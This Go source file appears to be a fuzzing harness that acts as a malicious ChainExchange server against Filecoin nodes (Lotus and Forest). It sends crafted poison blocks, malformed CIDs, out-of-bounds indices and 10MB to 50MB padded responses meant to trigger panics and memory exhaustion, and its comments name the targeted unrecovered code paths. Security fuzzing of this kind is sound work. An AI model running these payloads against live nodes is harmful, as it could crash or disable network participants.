package main

import (
	"bytes"
	"context"
	"io"
	"log"
	"time"

	"github.com/ipfs/go-cid"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/peer"
	cbg "github.com/whyrusleeping/cbor-gen"
)

// ---------------------------------------------------------------------------
// ChainExchange Server Attacks
//
// Pattern: Fuzzer acts as a malicious ChainExchange server.
// 1. Create fresh host, register malicious exchange handler
// 2. Register minimal Hello handler (respond to victim's Hello)
// 3. Connect to target, send Hello claiming heavier chain
// 4. Victim calls FetchTipSet → opens ChainExchange to us
// 5. Our handler responds with mutated data → potential crash
// ---------------------------------------------------------------------------

type responseMutation struct {
	id      string
	builder func(baseOpts blockHeaderOpts) []byte
}

func getAllExchangeServerAttacks() []namedAttack {
	attacks := []namedAttack{
		{
			name:       "exchange/all-response-with-duplicate-block-cid",
			targetedFn: func(t TargetNode) { runPoisonBlockReuse(ctx, t) },
			targetType: nodeAny,
		},
		{
			name:       "exchange/all-response-with-nil-secpk-message",
			targetedFn: func(t TargetNode) { runSplitFetchNilSecpk(ctx, t) },
			targetType: nodeAny,
		},
		{
			name:       "exchange/all-response-with-random-nil-block-fields",
			targetedFn: func(t TargetNode) { runRandomNilFields(ctx, t) },
			targetType: nodeAny,
		},
		{
			name:       "exchange/forest-response-with-10mb-padding",
			targetedFn: func(t TargetNode) { runOversizedResponse(ctx, t) },
			targetType: nodeForest, // only Forest has unbounded read_to_end
		},
		// New vectors
		{
			name:       "exchange/all-block-with-malformed-parent-cids",
			targetedFn: func(t TargetNode) { runMalformedParentCIDs(ctx, t) },
			targetType: nodeAny,
		},
		{
			name:       "exchange/forest-response-with-50mb-padding",
			targetedFn: func(t TargetNode) { runLargeOversizedResponse(ctx, t) },
			targetType: nodeForest, // Forest unbounded read_to_end
		},
		{
			name:       "exchange/lotus-request-with-malformed-head-cids",
			targetedFn: func(t TargetNode) { runMalformedRequestCIDs(ctx, t) },
			targetType: nodeLotus,
		},
		// Deep corruption vectors
		{
			name:       "exchange/all-block-message-with-bad-address",
			targetedFn: func(t TargetNode) { runBombAddrInMessages(ctx, t) },
			targetType: nodeAny,
		},
		{
			name:       "exchange/all-block-message-with-bad-bigint",
			targetedFn: func(t TargetNode) { runBombBigIntInMessages(ctx, t) },
			targetType: nodeAny,
		},
		{
			name:       "exchange/all-response-with-out-of-bounds-message-indices",
			targetedFn: func(t TargetNode) { runMismatchedIncludes(ctx, t) },
			targetType: nodeAny,
		},
		{
			name:       "exchange/all-tipset-with-mismatched-block-parents",
			targetedFn: func(t TargetNode) { runInconsistentTipsetParents(ctx, t) },
			targetType: nodeAny,
		},
		{
			name:       "exchange/all-ok-status-with-nil-chain",
			targetedFn: func(t TargetNode) { runStatusOkNilChain(ctx, t) },
			targetType: nodeAny,
		},
		{
			name:       "exchange/all-tipset-with-zero-blocks",
			targetedFn: func(t TargetNode) { runZeroLengthBlockArray(ctx, t) },
			targetType: nodeAny,
		},
		{
			name:       "exchange/forest-block-message-with-f4-delegated-address",
			targetedFn: func(t TargetNode) { runBombAddrF4Forest(ctx, t) },
			targetType: nodeForest,
		},
	}
	attacks = append(attacks, getAllRoundTripExchangeAttacks()...)
	return attacks
}

// runExchangeServerAttack executes a single server-side attack.
func runExchangeServerAttack(ctx context.Context, target TargetNode, mut responseMutation) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		debugLog("[%s] cannot fetch chain head for %s, skipping", mut.id, target.Name)
		return
	}

	baseOpts := blockHeaderOpts{
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	}

	resp := mut.builder(baseOpts)
	triggerBlock := buildBlockHeaderCBOR(baseOpts)
	triggerCID := blockCIDFromCBOR(triggerBlock)

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[%s] create host failed: %v", mut.id, err)
		return
	}
	defer h.Close()

	served := make(chan struct{}, 1)

	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(resp)
		select {
		case served <- struct{}{}:
		default:
		}
	})

	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[%s] connect failed: %v", mut.id, err)
		return
	}

	genesis := parseGenesisCID()
	payload := buildHelloMessage(
		[]cid.Cid{triggerCID},
		headInfo.Height+1,
		999999999,
		genesis,
	)
	sendHelloPayload(ctx, h, target.AddrInfo.ID, payload)

	select {
	case <-served:
		debugLog("[%s] malicious response served to %s", mut.id, target.Name)
	case <-time.After(15 * time.Second):
		debugLog("[%s] timeout waiting for victim fetch from %s", mut.id, target.Name)
	}
}

func sendHelloPayload(ctx context.Context, h host.Host, targetPeer peer.ID, payload []byte) {
	streamCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	s, err := h.NewStream(streamCtx, targetPeer, helloProtocol)
	if err != nil {
		debugLog("[trigger-hello] stream open failed: %v", err)
		return
	}
	defer s.Close()

	s.Write(payload)
	s.CloseWrite()
	io.Copy(io.Discard, io.LimitReader(s, 1024))
}

// ---------------------------------------------------------------------------
// Response helpers
// ---------------------------------------------------------------------------

func mergeOpts(base blockHeaderOpts, mutation blockHeaderOpts) blockHeaderOpts {
	mutation.overrideParentCIDs = base.overrideParentCIDs
	mutation.overrideHeight = base.overrideHeight
	mutation.overrideWeight = base.overrideWeight
	return mutation
}

func okResponse(chain ...[]byte) []byte {
	return buildResponseCBOR(0, "", chain)
}

// buildMultiBlockMsgsCBOR builds CompactedMessages for a 2-block tipset.
func buildMultiBlockMsgsCBOR() []byte {
	return cborArray(
		cborArray(),
		cborArray(cborArray(), cborArray()),
		cborArray(),
		cborArray(cborArray(), cborArray()),
	)
}

// ---------------------------------------------------------------------------
// Two-phase attack: poison-block-reuse (server-side, no recover)
// ---------------------------------------------------------------------------

func runPoisonBlockReuse(ctx context.Context, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		debugLog("[poison-block-reuse] cannot fetch chain head for %s, skipping", target.Name)
		return
	}

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[poison-block-reuse] create host failed: %v", err)
		return
	}
	defer h.Close()

	poisonCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
		nilTicket:          true,
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	})
	poisonCID := blockCIDFromCBOR(poisonCBOR)

	served := make(chan struct{}, 1)

	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(okResponse(buildBSTipSetCBOR([][]byte{poisonCBOR}, buildEmptyCompactedMsgsCBOR())))
		select {
		case served <- struct{}{}:
		default:
		}
	})

	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[poison-block-reuse] connect failed: %v", err)
		return
	}

	genesis := parseGenesisCID()
	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
		[]cid.Cid{poisonCID}, headInfo.Height+1, 999999999, genesis,
	))

	select {
	case <-served:
		log.Printf("[poison-block-reuse] poison block planted on %s (height=%d, cid=%s)",
			target.Name, headInfo.Height+1, poisonCID.String()[:16])
	case <-time.After(15 * time.Second):
		debugLog("[poison-block-reuse] timeout planting on %s", target.Name)
		return
	}

	// Phase 2: trigger server-side NewTipSet with duplicate CIDs
	streamCtx, streamCancel := context.WithTimeout(ctx, 10*time.Second)
	defer streamCancel()
	s, err := h.NewStream(streamCtx, target.AddrInfo.ID, exchangeProtocol)
	if err != nil {
		debugLog("[poison-block-reuse] phase 2 stream failed: %v", err)
		return
	}
	defer s.Close()

	s.Write(buildExchangeRequest([]cid.Cid{poisonCID, poisonCID}, 1, 1))
	s.CloseWrite()
	s.SetReadDeadline(time.Now().Add(10 * time.Second))
	io.Copy(io.Discard, io.LimitReader(s, 64*1024))
}

// ---------------------------------------------------------------------------
// Split fetch: serve nil Secpk in messages-only response
// ---------------------------------------------------------------------------

func runSplitFetchNilSecpk(ctx context.Context, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		debugLog("[split-fetch-nil-secpk] cannot fetch chain head for %s, skipping", target.Name)
		return
	}

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[split-fetch-nil-secpk] create host failed: %v", err)
		return
	}
	defer h.Close()

	blockCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	})
	blockCID := blockCIDFromCBOR(blockCBOR)

	served := make(chan struct{}, 1)

	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()
		reqData := make([]byte, 64*1024)
		n, _ := io.ReadAtLeast(s, reqData, 1)
		options := parseRequestOptions(reqData[:n])

		var resp []byte
		if options&1 != 0 {
			resp = okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, nil))
		} else if options&2 != 0 {
			resp = okResponse(buildBSTipSetCBOR(nil, buildNilSecpkCompactedMsgsCBOR()))
		} else {
			resp = okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, buildEmptyCompactedMsgsCBOR()))
		}

		s.Write(resp)
		select {
		case served <- struct{}{}:
		default:
		}
	})

	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[split-fetch-nil-secpk] connect failed: %v", err)
		return
	}

	genesis := parseGenesisCID()
	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
		[]cid.Cid{blockCID}, headInfo.Height+1, 999999999, genesis,
	))

	select {
	case <-served:
		debugLog("[split-fetch-nil-secpk] response served to %s", target.Name)
	case <-time.After(30 * time.Second):
		debugLog("[split-fetch-nil-secpk] timeout on %s", target.Name)
	}
}

// ---------------------------------------------------------------------------
// Random nil-field fuzzer (combinatorial search)
// ---------------------------------------------------------------------------

func runRandomNilFields(ctx context.Context, target TargetNode) {
	mut := responseMutation{
		id: "random-nil-fields",
		builder: func(base blockHeaderOpts) []byte {
			mutation := blockHeaderOpts{
				nilTicket:        rngIntn(2) == 0,
				nilElectionProof: rngIntn(2) == 0,
				nilBLSAggregate:  rngIntn(2) == 0,
				nilBlockSig:      rngIntn(2) == 0,
				nilBeaconEntries: rngIntn(2) == 0,
				nilParents:       rngIntn(3) == 0,
				emptyParents:     rngIntn(4) == 0,
			}

			numBlocks := 1
			if rngIntn(3) == 0 {
				numBlocks = 2
			}

			msgVariant := rngIntn(6)
			var blocks [][]byte
			var msgs []byte

			if numBlocks == 1 {
				opts := mergeOpts(base, mutation)
				if mutation.nilParents || mutation.emptyParents {
					opts.overrideParentCIDs = nil
				}
				blocks = [][]byte{buildBlockHeaderCBOR(opts)}
				switch msgVariant {
				case 0:
					msgs = buildEmptyCompactedMsgsCBOR()
				case 1:
					msgs = buildNilSecpkCompactedMsgsCBOR()
				case 2:
					msgs = buildNilBlsCompactedMsgsCBOR()
				case 3:
					msgs = buildOOBBlsIndexMsgsCBOR()
				case 4:
					msgs = buildOOBSecpkIndexMsgsCBOR()
				case 5:
					msgs = cborNil()
				}
			} else {
				optsA := mergeOpts(base, mutation)
				optsA.overrideMiner = []byte{0x00, 0xe8, 0x07}
				optsB := mergeOpts(base, blockHeaderOpts{
					nilTicket:        rngIntn(2) == 0,
					nilElectionProof: rngIntn(2) == 0,
					nilBLSAggregate:  rngIntn(2) == 0,
					nilBlockSig:      rngIntn(2) == 0,
					nilBeaconEntries: rngIntn(2) == 0,
					overrideMiner:    []byte{0x00, 0xe9, 0x07},
				})
				blocks = [][]byte{buildBlockHeaderCBOR(optsA), buildBlockHeaderCBOR(optsB)}
				msgs = buildMultiBlockMsgsCBOR()
			}

			return okResponse(buildBSTipSetCBOR(blocks, msgs))
		},
	}
	runExchangeServerAttack(ctx, target, mut)
}

// ---------------------------------------------------------------------------
// Oversized response attack (Forest OOM)
//

func runOversizedResponse(ctx context.Context, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		debugLog("[exchange-oom] cannot fetch chain head for %s, skipping", target.Name)
		return
	}

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[exchange-oom] create host failed: %v", err)
		return
	}
	defer h.Close()

	blockCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	})
	blockCID := blockCIDFromCBOR(blockCBOR)

	served := make(chan struct{}, 1)

	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))

		// Build a valid-looking response then pad with ~10MB of junk.
		// Forest's read_to_end() will consume the entire stream into memory.
		resp := okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, buildEmptyCompactedMsgsCBOR()))
		padded := make([]byte, len(resp)+10*1024*1024)
		copy(padded, resp)
		for i := len(resp); i < len(padded); i++ {
			padded[i] = byte(i % 256)
		}
		s.Write(padded)
		select {
		case served <- struct{}{}:
		default:
		}
	})

	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[exchange-oom] connect to %s failed: %v", target.Name, err)
		return
	}

	genesis := parseGenesisCID()
	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
		[]cid.Cid{blockCID}, headInfo.Height+1, 999999999, genesis,
	))

	select {
	case <-served:
		log.Printf("[exchange-oom] oversized response served to %s", target.Name)
	case <-time.After(30 * time.Second):
		debugLog("[exchange-oom] timeout on %s", target.Name)
	}
}

// ---------------------------------------------------------------------------
// Malformed parent CIDs attack (targets TipSetKey.Cids() panic)
//
// Serves a block with corrupted parent CID bytes. When the victim calls
// TipSetKey.Cids() at tipset_key.go:65, it panics on invalid CID data.
// ---------------------------------------------------------------------------

func runMalformedParentCIDs(ctx context.Context, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		debugLog("[exchange-malformed-cids] cannot fetch chain head for %s", target.Name)
		return
	}

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[exchange-malformed-cids] create host failed: %v", err)
		return
	}
	defer h.Close()

	// Build a block with corrupted parent CID bytes
	var malformedParents bytes.Buffer
	cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajArray, 1)
	switch rngIntn(3) {
	case 0: // Truncated CID: tag(42) + 2-byte bytestring
		cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajTag, 42)
		cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajByteString, 2)
		malformedParents.Write([]byte{0x00, 0x01})
	case 1: // CID with invalid multihash
		cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajTag, 42)
		garbage := append([]byte{0x00}, randomBytes(5)...)
		cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajByteString, uint64(len(garbage)))
		malformedParents.Write(garbage)
	case 2: // Empty CID bytes
		cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajTag, 42)
		cbg.WriteMajorTypeHeader(&malformedParents, cbg.MajByteString, 0)
	}

	fields := buildDefaultHeaderFields()
	fields[5] = malformedParents.Bytes() // Parents
	blockCBOR := cborArray(fields...)
	blockCID := blockCIDFromCBOR(blockCBOR)

	served := make(chan struct{}, 1)

	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, buildEmptyCompactedMsgsCBOR())))
		select {
		case served <- struct{}{}:
		default:
		}
	})

	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[exchange-malformed-cids] connect failed: %v", err)
		return
	}

	genesis := parseGenesisCID()
	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
		[]cid.Cid{blockCID}, headInfo.Height+1, 999999999, genesis,
	))

	select {
	case <-served:
		log.Printf("[exchange-malformed-cids] served to %s", target.Name)
	case <-time.After(15 * time.Second):
		debugLog("[exchange-malformed-cids] timeout on %s", target.Name)
	}
}

// ---------------------------------------------------------------------------
// Large oversized response (50MB — Forest OOM via unbounded read_to_end)
// ---------------------------------------------------------------------------

func runLargeOversizedResponse(ctx context.Context, target TargetNode) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		debugLog("[exchange-large-oom] cannot fetch chain head for %s", target.Name)
		return
	}

	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[exchange-large-oom] create host failed: %v", err)
		return
	}
	defer h.Close()

	blockCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	})
	blockCID := blockCIDFromCBOR(blockCBOR)

	served := make(chan struct{}, 1)

	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))

		resp := okResponse(buildBSTipSetCBOR([][]byte{blockCBOR}, buildEmptyCompactedMsgsCBOR()))
		padSize := 50 * 1024 * 1024 // 50MB
		padded := make([]byte, len(resp)+padSize)
		copy(padded, resp)
		for i := len(resp); i < len(padded); i++ {
			padded[i] = byte(i % 256)
		}
		s.Write(padded)
		select {
		case served <- struct{}{}:
		default:
		}
	})

	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[exchange-large-oom] connect to %s failed: %v", target.Name, err)
		return
	}

	genesis := parseGenesisCID()
	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
		[]cid.Cid{blockCID}, headInfo.Height+1, 999999999, genesis,
	))

	select {
	case <-served:
		log.Printf("[exchange-large-oom] 50MB response served to %s", target.Name)
	case <-time.After(30 * time.Second):
		debugLog("[exchange-large-oom] timeout on %s", target.Name)
	}
}

// ---------------------------------------------------------------------------
// Malformed request CIDs (targets Lotus server HandleStream — no recover)
//
// Sends a ChainExchange REQUEST with malformed CID bytes in the Head field.
// Lotus's exchange/server.go:HandleStream has NO recover(). If cid.Cast()
// panics on the malformed bytes, the server goroutine crashes.
// ---------------------------------------------------------------------------

func runMalformedRequestCIDs(ctx context.Context, target TargetNode) {
	h, err := pool.GetFresh(ctx)
	if err != nil {
		log.Printf("[exchange-malformed-req] create host failed: %v", err)
		return
	}
	defer h.Close()

	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		debugLog("[exchange-malformed-req] connect failed: %v", err)
		return
	}

	streamCtx, streamCancel := context.WithTimeout(ctx, 10*time.Second)
	defer streamCancel()
	s, err := h.NewStream(streamCtx, target.AddrInfo.ID, exchangeProtocol)
	if err != nil {
		debugLog("[exchange-malformed-req] stream failed: %v", err)
		return
	}
	defer s.Close()

	// Build a request with malformed CID bytes in the Head array
	var malformedHead bytes.Buffer
	cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajArray, 1)
	switch rngIntn(4) {
	case 0: // Tag 42 + truncated byte string
		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajTag, 42)
		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajByteString, 2)
		malformedHead.Write([]byte{0x00, 0xFF})
	case 1: // Tag 42 + empty bytes
		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajTag, 42)
		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajByteString, 0)
	case 2: // No tag, raw garbage bytes
		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajByteString, 8)
		malformedHead.Write(randomBytes(8))
	case 3: // Tag 42 + invalid multihash (bad varint)
		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajTag, 42)
		garbage := []byte{0x00, 0x80, 0x80, 0x80, 0x80}
		cbg.WriteMajorTypeHeader(&malformedHead, cbg.MajByteString, uint64(len(garbage)))
		malformedHead.Write(garbage)
	}

	request := cborArray(malformedHead.Bytes(), cborUint64(1), cborUint64(3))
	s.Write(request)
	s.CloseWrite()

	log.Printf("[exchange-malformed-req] sent malformed CID request to %s", target.Name)
	s.SetReadDeadline(time.Now().Add(10 * time.Second))
	io.Copy(io.Discard, io.LimitReader(s, 64*1024))
}

// ---------------------------------------------------------------------------
// Deep corruption vectors
// ---------------------------------------------------------------------------

func exchangeServerHelper(ctx context.Context, target TargetNode, id string, respBuilder func(*chainHeadInfo) []byte) {
	headInfo := fetchChainHead(target.Name)
	if headInfo == nil {
		return
	}
	resp := respBuilder(headInfo)
	blockCBOR := buildBlockHeaderCBOR(blockHeaderOpts{
		overrideParentCIDs: headInfo.CIDs,
		overrideHeight:     headInfo.Height + 1,
		overrideWeight:     999999999,
	})
	triggerCID := blockCIDFromCBOR(blockCBOR)

	h, err := pool.GetFresh(ctx)
	if err != nil {
		return
	}
	defer h.Close()

	served := make(chan struct{}, 1)
	h.SetStreamHandler(exchangeProtocol, func(s network.Stream) {
		defer s.Close()
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(resp)
		select {
		case served <- struct{}{}:
		default:
		}
	})
	h.SetStreamHandler(helloProtocol, func(s network.Stream) {
		io.Copy(io.Discard, io.LimitReader(s, 64*1024))
		s.Write(cborArray(cborInt64(0), cborInt64(0)))
		s.Close()
	})

	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()
	if err := h.Connect(connectCtx, target.AddrInfo); err != nil {
		return
	}

	genesis := parseGenesisCID()
	sendHelloPayload(ctx, h, target.AddrInfo.ID, buildHelloMessage(
		[]cid.Cid{triggerCID}, headInfo.Height+1, 999999999, genesis,
	))

	select {
	case <-served:
		log.Printf("[%s] served to %s", id, target.Name)
	case <-time.After(15 * time.Second):
		debugLog("[%s] timeout on %s", id, target.Name)
	}
}

func runBombAddrInMessages(ctx context.Context, target TargetNode) {
	exchangeServerHelper(ctx, target, "bomb-addr-msgs", func(head *chainHeadInfo) []byte {
		addr := generateRoundTripBombAddress()
		msgs := buildCompactedMsgsWithBombMsg(addr)
		block := buildBlockHeaderCBOR(blockHeaderOpts{
			overrideParentCIDs: head.CIDs,
			overrideHeight:     head.Height + 1,
			overrideWeight:     999999999,
		})
		return okResponse(buildBSTipSetCBOR([][]byte{block}, msgs))
	})
}

func runBombBigIntInMessages(ctx context.Context, target TargetNode) {
	exchangeServerHelper(ctx, target, "bomb-bigint-msgs", func(head *chainHeadInfo) []byte {
		bombVal := generateRoundTripBombBigInt()
		bombMsg := buildMessageCBORWithBigInt(bombVal)
		msgs := cborArray(
			cborArray(bombMsg),
			cborArray(cborArray(cborUint64(0))),
			cborArray(),
			cborArray(cborArray()),
		)
		block := buildBlockHeaderCBOR(blockHeaderOpts{
			overrideParentCIDs: head.CIDs,
			overrideHeight:     head.Height + 1,
			overrideWeight:     999999999,
		})
		return okResponse(buildBSTipSetCBOR([][]byte{block}, msgs))
	})
}

func runMismatchedIncludes(ctx context.Context, target TargetNode) {
	exchangeServerHelper(ctx, target, "mismatched-includes", func(head *chainHeadInfo) []byte {
		// 2 blocks but BlsIncludes references block index 5 (OOB)
		shared := newSharedBlockCIDs()
		blockA := buildBlockHeaderCBOR(blockHeaderOpts{
			overrideParentCIDs: head.CIDs,
			overrideHeight:     head.Height + 1,
			overrideWeight:     999999999,
			overrideMiner:      []byte{0x00, 0xe8, 0x07},
			overrideCIDs:       shared,
		})
		blockB := buildBlockHeaderCBOR(blockHeaderOpts{
			overrideParentCIDs: head.CIDs,
			overrideHeight:     head.Height + 1,
			overrideWeight:     999999999,
			overrideMiner:      []byte{0x00, 0xe9, 0x07},
			overrideCIDs:       shared,
		})
		msgs := cborArray(
			cborArray(),
			cborArray(cborArray(cborUint64(5)), cborArray()), // OOB index 5 for block 0
			cborArray(),
			cborArray(cborArray(), cborArray()),
		)
		return okResponse(buildBSTipSetCBOR([][]byte{blockA, blockB}, msgs))
	})
}

func runInconsistentTipsetParents(ctx context.Context, target TargetNode) {
	exchangeServerHelper(ctx, target, "inconsistent-parents", func(head *chainHeadInfo) []byte {
		// 2 blocks with different parents — should be rejected by NewTipSet
		blockA := buildBlockHeaderCBOR(blockHeaderOpts{
			overrideParentCIDs: head.CIDs,
			overrideHeight:     head.Height + 1,
			overrideWeight:     999999999,
			overrideMiner:      []byte{0x00, 0xe8, 0x07},
		})
		blockB := buildBlockHeaderCBOR(blockHeaderOpts{
			overrideHeight:  head.Height + 1,
			overrideWeight:  999999999,
			overrideMiner:   []byte{0x00, 0xe9, 0x07},
			// No overrideParentCIDs → random parents (different from blockA)
		})
		return okResponse(buildBSTipSetCBOR([][]byte{blockA, blockB}, buildMultiBlockMsgsCBOR()))
	})
}

func runStatusOkNilChain(ctx context.Context, target TargetNode) {
	exchangeServerHelper(ctx, target, "status-ok-nil-chain", func(head *chainHeadInfo) []byte {
		return buildResponseCBOR(0, "", nil) // status OK but no chain data
	})
}

func runZeroLengthBlockArray(ctx context.Context, target TargetNode) {
	exchangeServerHelper(ctx, target, "zero-blocks", func(head *chainHeadInfo) []byte {
		return okResponse(buildBSTipSetCBOR([][]byte{}, buildEmptyCompactedMsgsCBOR()))
	})
}

func runBombAddrF4Forest(ctx context.Context, target TargetNode) {
	exchangeServerHelper(ctx, target, "bomb-f4-forest", func(head *chainHeadInfo) []byte {
		addr := generateF4Address(10, 20)
		msgs := buildCompactedMsgsWithBombMsg(addr)
		block := buildBlockHeaderCBOR(blockHeaderOpts{
			overrideParentCIDs: head.CIDs,
			overrideHeight:     head.Height + 1,
			overrideWeight:     999999999,
		})
		return okResponse(buildBSTipSetCBOR([][]byte{block}, msgs))
	})
}
